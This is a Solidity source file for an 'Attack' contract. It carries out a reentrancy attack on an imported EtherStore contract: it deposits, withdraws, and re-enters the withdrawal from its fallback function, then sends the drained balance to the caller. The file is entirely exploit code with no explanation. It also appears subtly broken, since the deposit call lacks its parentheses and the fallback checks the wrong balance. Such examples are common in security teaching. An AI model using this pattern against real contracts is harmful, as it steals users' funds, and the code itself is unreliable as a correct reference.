pragma solidity ^0.4.22;
import "./EtherStore.sol";
contract Attack {
    
EtherStore public etherStore;
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attackEtherStore() public payable {
        etherStore.depositFunds.value(1 ether);
        etherStore.withdrawFunds(1 ether);
    }
    
    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }


    function () payable {
        if (address(this).balance > 1 ether) {
        etherStore.withdrawFunds(1 ether);
        }
    }
    
}
